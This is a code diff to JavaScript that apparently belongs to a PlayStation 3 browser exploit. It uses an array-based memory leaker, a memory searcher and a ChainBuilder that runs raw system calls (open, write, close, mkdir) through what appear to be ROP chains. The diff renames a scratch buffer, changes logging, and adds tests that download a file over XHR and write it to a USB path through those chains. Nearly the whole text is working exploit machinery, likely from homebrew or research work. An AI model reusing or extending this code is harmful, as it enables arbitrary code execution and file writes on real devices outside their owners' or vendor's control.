@@ -68,8 +68,11 @@ var searcher = null;
 		var buttonFileTest = document.getElementById("buttonFileTest");
 		buttonFileTest.addEventListener("click", () => fileTest());
 		
-		var buttonLogClear = document.getElementById("buttonLogClear");
-		buttonLogClear.addEventListener("click", () => logger.clear());
+		var buttonXhrTest = document.getElementById("buttonXhrTest");
+		buttonXhrTest.addEventListener("click", () => xhrTest());
+		
+		var buttonXhrFileTest = document.getElementById("buttonXhrFileTest");
+		buttonXhrFileTest.addEventListener("click", () => xhrFileTest());
 	} catch (e) {
 		if (environment.ps3) {
 			alert(e);
@@ -81,11 +84,11 @@ var searcher = null;
 ///////////////////////////////////////
 
 var arrayLeaker = null;
-var buffer = null, addrBuffer = null;
+var gtemp = null, addrGtemp = null;
 
 function init() {
 	if (arrayLeaker === null || !arrayLeaker.verify()) {
-		logger.info("Initializing");
+		logger.debug("Initializing...");
 		
 		arrayLeaker = new ArrayLeaker(memoryReader);
 		arrayLeaker.createArray(20);
@@ -96,27 +99,29 @@ function init() {
 		return searcher.startArray(searchStart, searchEnd - searchStart, arrayLeaker.getArray())
 			.then((match) => {
 				if (match === null) {
-					throw new Error("Failed to init ArrayLeaker.");;
+					throw new Error("Failed to init ArrayLeaker.");
 				}
 				
-				logger.info(`Found ArrayLeaker array at 0x${match.toString(16)}`);
+				logger.debug(`Found ArrayLeaker array at 0x${match.toString(16)}`);
 				arrayLeaker.setAddress(match);
 			})
 			.then(() => {
-				logger.info("Creating buffers...");
+				logger.debug("Creating buffers...");
 				
 				var i = 0;
-				buffer = Util.ascii("gtmp") + Util.pad(0x1000);
-				arrayLeaker.setString(i, buffer);
-				addrBuffer = arrayLeaker.getStringAddress(i);
-				if (addrBuffer === null) {
-					logger.error("Failed to get buffer address.");
+				
+				gtemp = Util.ascii("gtmp") + Util.pad(0x1000);
+				addrGtemp = arrayLeaker.setAndGetAddress(i++, gtemp);
+				if (addrGtemp === null) {
+					logger.error("Failed to get gtemp address.");
 					return;
 				}
-				addrBuffer += 4;
-				logger.info(`Found buffer at 0x${addrBuffer.toString(16)}`);
+				addrGtemp += 4;
+				logger.debug(`Found gtemp at 0x${addrGtemp.toString(16)}`);
 				
-				logger.info("Created buffers.");
+				logger.debug("Created buffers.");
+				
+				logger.debug("Initialized.");
 			});
 	}
 	
@@ -147,25 +152,25 @@ function fileTest() {
 			var result = fsOpen(path);
 			var errno = result.errno;
 			var fd = result.fd;
-			logger.info(`Errno: 0x${errno.toString(16)}`);
-			logger.info(`Fd: 0x${fd.toString(16)}`);
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
+			logger.debug(`Fd: 0x${fd.toString(16)}`);
 			
 			var testStr = "This is a test!";
 			result = fsWrite(fd, Util.ascii(testStr), testStr.length);
 			errno = result.errno;
 			var written = result.written;
-			logger.info(`Errno: 0x${errno.toString(16)}`);
-			logger.info(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
+			logger.debug(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
 			
 			errno = fsClose(fd);
-			logger.info(`Errno: 0x${errno.toString(16)}`);
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
 		})
 		.then(() => logger.info("File test done."))
 		.catch((error) => logger.error(`Error while doing file test. ${error}`));
 }
 
 function fsMkdir(strpath) {
-	var chain = new ChainBuilder(offsets, addrBuffer)
+	var chain = new ChainBuilder(offsets, addrGtemp)
 		.addDataStr("path", Util.ascii(strpath))
 		.addDataInt32("errno")
 		.syscall(0x32B, "path", 0o700)
@@ -179,7 +184,7 @@ function fsMkdir(strpath) {
 }
 
 function fsOpen(strpath) {
-	var chain = new ChainBuilder(offsets, addrBuffer)
+	var chain = new ChainBuilder(offsets, addrGtemp)
 		.addDataStr("path", Util.ascii(strpath))
 		.addDataInt32("errno")
 		.addDataInt32("fd")
@@ -196,7 +201,7 @@ function fsOpen(strpath) {
 }
 
 function fsWrite(fd, buffer, size) {
-	var chain = new ChainBuilder(offsets, addrBuffer)
+	var chain = new ChainBuilder(offsets, addrGtemp)
 		.addDataStr("buffer", buffer)
 		.addDataInt32("errno")
 		.addDataInt64("written")
@@ -211,7 +216,7 @@ function fsWrite(fd, buffer, size) {
 }
 
 function fsClose(fd) {
-	var chain = new ChainBuilder(offsets, addrBuffer)
+	var chain = new ChainBuilder(offsets, addrGtemp)
 		.addDataInt32("errno")
 		.syscall(0x324, fd)
 		.storeR3("errno")
@@ -221,6 +226,61 @@ function fsClose(fd) {
 	chain.execute();
 	
 	return chain.getDataInt32("errno");
+}
+
+function request(method, url) {
+    return new Promise((resolve) => {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, url);
+        xhr.onload = () => {
+        	resolve(xhr);
+        };
+        xhr.onerror = (e) => {
+        	throw new Error(e);
+        };
+        xhr.send();
+    });
+}
+
+function xhrTest() {
+	logger.info("XHR test...");
+	
+	Promise.resolve()
+		.then(() => request("GET", "xhr.txt"))
+		.then((xhr) => {
+			logger.debug(xhr.responseText);
+		})
+		.catch((error) => { logger.error(`Error during request. ${error}`); });
+	
+	logger.info("XHR test done.");
+}
+
+function xhrFileTest() {
+	logger.info("XHR File test...");
+	
+	Promise.resolve()
+		.then(() => init())
+		.then(() => request("GET", "xhr.txt"))
+		.then((xhr) => {
+			var path = "/dev_usb000/xhr.txt";
+			var result = fsOpen(path);
+			var errno = result.errno;
+			var fd = result.fd;
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
+			logger.debug(`Fd: 0x${fd.toString(16)}`);
+			
+			var testStr = xhr.responseText;
+			result = fsWrite(fd, Util.ascii(testStr), testStr.length);
+			errno = result.errno;
+			var written = result.written;
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
+			logger.debug(`Written: 0x${Util.hex32(written.high)}${Util.hex32(written.low)}`);
+			
+			errno = fsClose(fd);
+			logger.debug(`Errno: 0x${errno.toString(16)}`);
+		})
+		.then(() => logger.info("XHR File test done."))
+		.catch((error) => logger.error(`Error while doing file test. ${error}`));
 }
 
 ///////////////////////////////////////
